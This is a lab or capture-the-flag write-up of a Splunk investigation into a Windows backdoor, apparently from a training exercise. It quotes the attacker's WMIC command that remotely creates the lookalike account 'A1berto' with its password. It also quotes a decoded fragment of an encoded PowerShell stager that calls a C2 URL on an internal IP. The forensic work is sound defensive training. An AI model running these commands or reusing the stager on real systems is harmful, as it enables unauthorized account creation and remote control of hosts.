# Investigating a Windows Backdoor Compromise Using Splunk

## Scenario

SOC Analyst **Johny** identified anomalous behavior across several Windows hosts, indicating that an adversary had gained access to the environment and successfully created a backdoor. His manager tasked him with pulling the relevant logs from the suspected hosts and ingesting them into Splunk for investigation.

The objective of this exercise was to analyze the ingested logs, trace the adversary's actions, and answer a series of investigative questions.

---

## Q1: How many events were collected and ingested in the `main` index?

With the Splunk search head time range set to **All Time**, the following base query was run:

```spl
index="main"
```

**Result:** `12,256` events were ingested into the `main` index.

---

## Q2: What username did the adversary create as a backdoor account?

Starting from the base query (`index="main"`), I added the `CommandLine` field via the **More Fields** option to inspect process execution details. This surfaced the following command:

```spl
"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
```

This shows WMIC being used to remotely create a local user account named `A1berto` on `WORKSTATION6`, with the password `paw0rd1`.

**Answer:** `A1berto`

---

## Q3: What is the full registry key path updated for the new backdoor user?

New local user creation is reflected in the SAM registry hive, which is logged via **Sysmon Event ID 13 (Registry Value Set)**. The following query was used:

```spl
index="main" EventID="13" "A1berto"
```

This returned a single matching event with the following details:

```
Message: Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2022-02-14 12:06:02.420
ProcessGuid: {83d0c8c3-43ca-5f5f-0c00-000000000400}
ProcessId: 740
Image: C:\windows\system32\lsass.exe
TargetObject: HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto\(Default)
Details: Binary Data
```

**Answer:**
```
HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto
```

---

## Q4: Which legitimate user was the adversary attempting to impersonate?

The backdoor username `A1berto` is a deliberate lookalike for **Alberto**, with the adversary substituting the digit `1` for the lowercase letter `l` to blend in with legitimate account naming conventions.

**Answer:** `Alberto`

---

## Q5: What command was used to add the backdoor user from a remote computer?

This was already identified in **Q2** — the adversary used WMIC to remotely trigger process creation on `WORKSTATION6`:

```spl
"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"
```

---

## Q6: How many login attempts were observed from the backdoor user?

```spl
index=main a1berto
```

Filtering further on **Event ID 4624 (An account was successfully logged on)** returned **0 events**.

**Answer:** `0` — no successful logins were observed from the `A1berto` account during the investigation window.

---

## Q7: Which infected host executed the suspicious PowerShell commands?

```spl
index=main workstation6 CommandLine="\"C:\\windows\\System32\\Wbem\\WMIC.exe\" /node:WORKSTATION6 process call create \"net user /add A1berto paw0rd1\""
```

This returned a single result, with the `Hostname` field identifying the source host.

**Answer:** `james.browne`

---

## Q8: How many events were logged for the malicious PowerShell execution?

With PowerShell logging enabled on the host, the `SourceName` field was used to isolate PowerShell-related events:

```spl
index=main SourceName="Microsoft-Windows-PowerShell"
```

**Answer:** `79` events.

---

## Q9: What is the full URL requested by the encoded PowerShell command?

Narrowing the search further:

```spl
index=main SourceName=PowerShell
```

This returned **14 events**. The first event, categorized under **Pipeline Execution Details**, originated from host `james.browne` and contained a `HostApplication` field with an encoded PowerShell command:

```
HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc <base64-encoded-blob>
```

### Decoding the payload

Using CyberChef, the encoded blob was processed with:
1. **From Base64**
2. **Decode Text** → `UTF-16LE (1200)`

This revealed the following PowerShell snippet:

```powershell
SYsteM.Net.WEbClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TeXT.ENCodiNG]::UnicodE.GetStriNG([CoNVeRT]::FroMBASe64StRInG('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));$t='/news.php';
```

The `$ser` variable holds a further Base64-encoded string, which decodes to the C2 host, and `$t` holds the request path:

```
aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA== → http://10.10.10.5
```

Combining the host (`$ser`) and path (`$t`) gives the full callback URL. As Per the required defanged format:

**Answer:**
```
hxxp[://]10[.]10[.]10[.]5/news[.]php
```

---

## Summary

| # | Finding |
|---|---------|
| Total events ingested | 12,256 |
| Backdoor username | `A1berto` |
| Registry artifact | `HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto` |
| Impersonated user | Alberto |
| Remote user-creation vector | WMIC `process call create` against `WORKSTATION6` |
| Backdoor account logins | 0 |
| Infected host | james.browne |
| PowerShell events logged | 79 |
| C2 callback URL | `hxxp[://]10[.]10[.]10[.]5/news[.]php` |
